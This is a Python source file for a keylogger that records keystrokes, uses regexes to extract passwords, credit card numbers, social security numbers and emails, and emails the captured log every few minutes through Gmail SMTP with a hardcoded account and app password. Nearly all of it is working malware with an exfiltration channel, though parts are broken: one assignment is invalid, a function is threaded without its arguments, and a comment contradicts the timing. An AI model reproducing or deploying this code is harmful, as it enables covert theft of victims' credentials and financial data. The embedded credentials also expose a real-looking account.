# ===================================================== Basic keylogger ================================================

import keyboard
import os


# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


def keylogger():
    try:
        while True:
            with open(path, "a") as data_file:

                # All key presses are recorded as a list into "events"
                # and the record loop stops when the "enter" key is pressed
                events = keyboard.record("enter")
                password = list(keyboard.get_typed_strings(events))

                data_file.write("\n")  # New line written before data is written
                data_file.write(password[0])
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Sending by email =========================================================


import re
from collections import Counter
import os


def extract_valuable_info(keysniffer_data, filtered_data):

    with open(keysniffer_data, "r") as file:
        data = file.read()

    # Define patterns for valuable information
    patterns = {
        "emails": r"[\w.-]+@[\w.-]+\.\w+",
        "phone_numbers": r"\b\d{10}\b|\b\d{3}[-.\s]\d{3}[-.\s]\d{4}\b",
        "urls": r"https?://\S+",
        "credit_cards": r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b",
        "passwords": r"(?i)(password|pass):\s*\S+",
        "usernames": r"(?i)(username|user):\s*\S+",
        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        "dates": r"\b\d{4}-\d{2}-\d{2}\b|\b\d{2}/\d{2}/\d{4}\b",
        "social_security_numbers": r"\b\d{3}-\d{2}-\d{4}\b",
    }

    extracted_data = {}

    for key, pattern in patterns.items():
        matches = re.findall(pattern, data)
        extracted_data[key] = matches

    # Most common words typed
    words = re.findall(r"\b\w+\b", data)
    common_words = Counter(words).most_common(10)
    extracted_data["common_words"] = common_words

    # Verify if the output file exists, create it if not
    if not os.path.exists(filtered_data):
        with open(filtered_data, "w") as filtered_data:
            pass

    # Write the extracted data to the output file
    with open(filtered_data, "w") as filtered_data:
        for category, items in extracted_data.items():
            filtered_data.write(f"{category.capitalize()}:\n")
            for item in items:
                filtered_data.write(f"  {item}\n")
            filtered_data.write("\n")


# usage
keysniffer_data = "keysniffer_data.txt"  # Path to the log file
filtered_data = "valuable_info.txt"  # Path to the output file
extract_valuable_info(keysniffer_data, filtered_data)


# ===================================================== Sending by email =========================================================


import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Email sender and receiver details
password = "ixtzymqtphizlcet"
sender_email = "7unkym0nk3y@gmail.com"  # email from the account
receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender

# File to attach
keysniffer_data.txt = "keysniffer_data.txt"


def send_email():

    # Create the email object
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachment: keysniffer_data.txt"

    # Email body
    email_body = """<html><body><p>Please find the attached file keysniffer_data.txt.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    # Attach the file
    with open(keysniffer_data, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={keysniffer_data}",
        )
        message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP(
            "smtp.gmail.com:587"
        ) as server:  # Replace with your SMTP server and port
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():

    # Sends the keysniffer_data.txt file as an email attachment every 5 minutes.

    while True:
        send_email()
        time.sleep(120)  # Wait for 2 minutes


# ===================================================== Programm working =========================================================


import threading

# Run keylogger and send_email_periodically simultaneously using threads
if __name__ == "__main__":
    try:
        # Start the keylogger in one thread
        keylogger_thread = threading.Thread(target=keylogger, daemon=True)

        # Start the keylogger in another thread
        filter_thread = threading.Thread(target=extract_valuable_info, daemon=True)

        # Start the email sender in another thread
        email_thread = threading.Thread(target=send_email_periodically, daemon=True)

        filter_thread.start()
        keylogger_thread.start()
        email_thread.start()

        # Keep the main thread alive
        filter_thread.join()
        keylogger_thread.join()
        email_thread.join()

    except KeyboardInterrupt:
        print("Program stopped.")
